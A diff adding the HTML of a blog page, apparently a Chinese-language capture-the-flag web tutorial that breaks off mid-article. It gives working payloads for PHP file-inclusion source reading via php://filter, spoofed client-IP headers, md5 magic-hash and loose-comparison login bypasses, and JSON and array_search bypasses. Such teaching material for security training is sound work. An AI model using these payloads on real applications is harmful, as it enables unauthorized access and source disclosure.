@@ -1,0 +1,1113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-undefined.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wiki.w-ais.cn","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="Web tutorial by WUST-AIS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web In CTF">
+<meta property="og:url" content="https://wiki.w-ais.cn/2019/07/14/Web-In-CTF/index.html">
+<meta property="og:site_name" content="WUST-AIS">
+<meta property="og:description" content="Web tutorial by WUST-AIS">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/12ScvV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/12S2uT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/12BSxg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/12B9MQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/12BCrj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120Oat.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120LVI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120I2D.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120Hrd.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/1204PK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120vPf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/02/07/120xG8.png">
+<meta property="article:published_time" content="2019-07-14T07:40:14.000Z">
+<meta property="article:modified_time" content="2020-04-01T11:29:07.866Z">
+<meta property="article:author" content="WUST-AIS">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2020/02/07/12ScvV.png">
+
+<link rel="canonical" href="https://wiki.w-ais.cn/2019/07/14/Web-In-CTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>Web In CTF | WUST-AIS</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WUST-AIS</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wiki.w-ais.cn/2019/07/14/Web-In-CTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/logo.png">
+      <meta itemprop="name" content="WUST-AIS">
+      <meta itemprop="description" content="Join us">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WUST-AIS">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web In CTF
+        </h1>
+
+        <div class="post-meta">
+           
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-07-14 15:40:14" itemprop="dateCreated datePublished" datetime="2019-07-14T15:40:14+08:00">2019-07-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-04-01 19:29:07" itemprop="dateModified" datetime="2020-04-01T19:29:07+08:00">2020-04-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Web tutorial by WUST-AIS</p>
+<a id="more"></a>
+
+<h2 id="常见套路"><a href="#常见套路" class="headerlink" title="常见套路"></a>常见套路</h2><ul>
+<li>爆破，包括<code>md5</code>、爆破随机数、验证码识别等</li>
+<li>绕<code>WAF</code>，包括花式绕<code>Mysql</code>、绕文件读取关键词检测之类拦截</li>
+<li>花式玩弄几个PHP特性，包括弱类型，<code>strpos</code>和<code>===</code>，反序列化 <code>destruct</code>、<code>\0</code>截断</li>
+<li>各种找源码技巧，包括<code>git</code>、<code>svn</code>、<code>xxx.php.swp</code>、<code>*www*.(zip|tar.gz|rar|7z)</code>、<code>xxx.php.bak</code></li>
+<li>文件上传，包括花式文件后缀 <code>.php345</code> ，<code>.inc</code>， <code>.phtml</code>， <code>.phpt</code>， <code>.phps</code>、各种文件内容检测<code>&lt;?php</code>, <code>&lt;?</code>,  <code>&lt;%</code>,  <code>&lt;script language=php&gt;</code>、花式解析漏洞</li>
+<li><code>Mysql</code>类型差异，包括和PHP弱类型类似的特性，<code>0x</code>、<code>0b</code>、<code>1e</code>之类，<code>varchar</code>和<code>integer</code>相互转换</li>
+<li><code>open_basedir</code>、<code>disable_functions</code>花式绕过技巧，包括<code>dl</code>、<code>mail</code>、<code>imagick</code>、<code>bash</code>漏洞、<code>DirectoryIterator</code>及各种二进制选手插足的方法</li>
+<li>社工，包括花式查社工库、微博、QQ签名、<code>whois</code></li>
+<li><code>windows</code>特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、<code>::$DATA</code>，冒号截断</li>
+<li>XSS，各种浏览器<code>auditor</code>绕过、富文本过滤黑白名单绕过、<code>flash xss</code></li>
+<li>XXE，各种XML存在地方（<code>rss</code>/<code>word</code>/流媒体）、各种XXE利用方法（SSRF、文件读取）</li>
+<li>HTTP协议，花式IP伪造<code>X-Forwarded-For</code>/<code>X-Client-IP</code>/<code>X-Real-IP</code>/<code>CDN-Src-IP</code>、花式改UA，花式藏FLAG、花式分析数据包</li>
+</ul>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><p>在线上CTF赛事的Web题目中，网页源代码是一个很重要的思路来源，按F12或右键查看源代码即可。</p>
+<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>爬虫协议，有时可以通过它看见一些重要的目录。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;images&#x2F;</span><br><span class="line">Disallow: &#x2F;f1ag.txt&#x2F;</span><br><span class="line">Disallow: &#x2F;tips.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>一般在右键源代码中，有时注释隐藏着重要的信息或者tips，或者出题者写下的思路。</p>
+<h3 id="备份文件源码泄漏"><a href="#备份文件源码泄漏" class="headerlink" title="备份文件源码泄漏"></a>备份文件源码泄漏</h3><p>​    常见备份文件后缀：</p>
+<ul>
+<li><p><code>.rar</code></p>
+</li>
+<li><p><code>.zip</code></p>
+</li>
+<li><p><code>.7z</code></p>
+</li>
+<li><p><code>.tar.gz</code></p>
+</li>
+<li><p><code>.bak</code></p>
+</li>
+<li><p><code>.swp</code></p>
+</li>
+<li><p><code>.txt</code></p>
+</li>
+<li><p><code>.html</code></p>
+</li>
+<li><p><code>linux</code>中可能以” <code>~</code> “ 结尾</p>
+</li>
+<li><p><code>ng</code>源码泄露，<code>git</code>源码泄露，<code>DS_Store</code>文件泄漏，网站备份压缩文件，SVN导致文件泄露，WEB-INF/web.xml泄露，CVS泄漏等，可参考以下资料：</p>
+<p><a href="https://www.cnblogs.com/xishaonian/p/7628153.html" target="_blank" rel="noopener">CTF中常见Web源码泄露总结</a></p>
+<p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">常见Web源码泄露解析</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/21296806" target="_blank" rel="noopener">文件泄露</a></p>
+</li>
+</ul>
+<h3 id="include漏洞"><a href="#include漏洞" class="headerlink" title="include漏洞"></a>include漏洞</h3><p>遇到<code>php</code>代码中有<code>include($file)</code>的，一般和 <code>php://input</code>或者<code>php://filter</code>有关，​<code>$file</code>值如果是<code>php://input</code>，就要用post表单构造数据，如果是<code>php://filter</code>，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encoding/resource=文件名(如index.php)</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="抓包-HTTP"><a href="#抓包-HTTP" class="headerlink" title="抓包/HTTP"></a>抓包/HTTP</h2><h3 id="GET-amp-POST"><a href="#GET-amp-POST" class="headerlink" title="GET&amp;POST"></a>GET&amp;POST</h3><p>Get和Post操作是传参的基本操作，也是CTF中很常见的常规操作。</p>
+<p>GET：在<code>url</code>中提交参数，如<code>/index.php?a=1</code></p>
+<p>POST：可通过<code>hackbar</code>或抓包插入post数据提交</p>
+<p>最直接的区别：</p>
+<p>GET请求的参数是放在URL里的，POST请求参数是放在请求body里的。</p>
+<h3 id="HTTP头部绕过姿势"><a href="#HTTP头部绕过姿势" class="headerlink" title="HTTP头部绕过姿势"></a>HTTP头部绕过姿势</h3><ul>
+<li><p>如果提示需要本地ip或指定ip才能访问，则可在报文头部添加以下几种常用信息段：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">X-Client-IP</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Client-IP</span>: 127.0.0.1</span><br><span class="line">(ip地址可以根据需要修改)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果需要验证网页来源，如一定要从谷歌跳转过来的页面才允许访问，则可在报文头部添加：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: https://www.google.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果网页需要验证cookie，我们可以在http头部加入：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: u = stupid;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>除了以上几种常见的情况，还需根据具体情况来使用不同的操作</p>
+</li>
+</ul>
+<h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><h3 id="php弱类型"><a href="#php弱类型" class="headerlink" title="php弱类型"></a>php弱类型</h3><h4 id="与"><a href="#与" class="headerlink" title="== 与 ==="></a>== 与 ===</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a == $b ;</span><br><span class="line">	$a === $b ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</span></span><br><span class="line"><span class="comment">// == 在进行比较的时候，会先将字符串类型转化成相同，再比较</span></span><br></pre></td></tr></table></figure>
+
+<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"admin"</span> == <span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span>== <span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>== <span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>== <span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>); <span class="comment">//true </span></span><br><span class="line"><span class="meta">?&gt;</span>  <span class="comment">//上述代码可自行测试</span></span><br><span class="line">    </span><br><span class="line"> <span class="comment">// 观察上述代码</span></span><br><span class="line"> <span class="comment">//"admin"==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等</span></span><br><span class="line"> <span class="comment">//"1admin"==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，即是"admin1"被转化成了0,为什么呢？？</span></span><br><span class="line"> <span class="comment">//"0e123456"=="0e456789"相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</span></span><br></pre></td></tr></table></figure>
+
+<p><code>php</code>手册：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含'.','e','E'并且其数值值在整形的范围之内</span></span><br><span class="line"><span class="comment">该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test=<span class="number">1</span> + <span class="string">"10.5"</span>; <span class="comment">// $test=11.5(float)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"-1.3e3"</span>; <span class="comment">//$test=-1299(float)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"bob-1.3e3"</span>;<span class="comment">//$test=1(int)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"2admin"</span>;<span class="comment">//$test=3(int)</span></span><br><span class="line">$test=<span class="number">1</span>+<span class="string">"admin2"</span>;<span class="comment">//$test=1(int)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">So that<span class="string">'s why " "admin1"==1 =&gt;False "</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2020/02/07/12ScvV.png" alt="12ScvV.png"></p>
+<h4 id="md5绕过-Hash比较缺陷"><a href="#md5绕过-Hash比较缺陷" class="headerlink" title="md5绕过(Hash比较缺陷)"></a>md5绕过(Hash比较缺陷)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $logined = <span class="keyword">true</span>;</span><br><span class="line">    $Username = $_GET[<span class="string">'Username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!ctype_alpha($Username)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (!is_numeric($password) ) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (md5($Username) != md5($password)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> ($logined)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"login failed!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句 </p>
+<p>介绍一批md5开头是0e的字符串</p>
+<p><strong>0e在比较的时候会将其视作为科学计数法</strong>，所以无论0e后面是什么，0的多少次方还是0。</p>
+<p>键入<strong>md5(‘240610708’) == md5(‘QNKCDZO’)</strong>成功绕过！</p>
+<p>收集md5开头是0e的字符串（来源于网络）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key == $key) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输入一个json类型的字符串，json_decode函数解成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，<strong>但是可以利用0==”admin”这种形式绕过</strong>.</p>
+<p>*<em>最终payload *</em></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message=&#123;"key":0&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search is_array绕过"></a>array_search is_array绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!is_array($_GET[<span class="string">'test'</span>]))&#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line">$test=$_GET[<span class="string">'test'</span>];</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($test);$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>($test[$i]===<span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i]=intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">"admin"</span>,$test)===<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: test[]=<span class="number">0</span><span class="comment">//可以绕过</span></span><br></pre></td></tr></table></figure>
+
+<p>官方手册对array_search的介绍</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed array_search ( mixed $needle , <span class="keyword">array</span> $haystack [], bool $strict = <span class="keyword">false</span> )</span><br></pre></td></tr></table></figure>
+
+<p>$needle，$haystack必需，$strict可选  函数判断$haystack中的值是存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a=<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">	var_dump(array_search(<span class="string">"admin"</span>,$a));  <span class="comment">// int(0) ==&gt; 返回键值0</span></span><br><span class="line">	var_dump(array_search(<span class="string">"1admin"</span>,$a)); <span class="comment">// int(1) ==&gt; 返回键值1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>array_search函数 类似于 == 也就是$a ==”admin” 当然是$a=0  当然如果第三个参数为true则就不能绕过。</p>
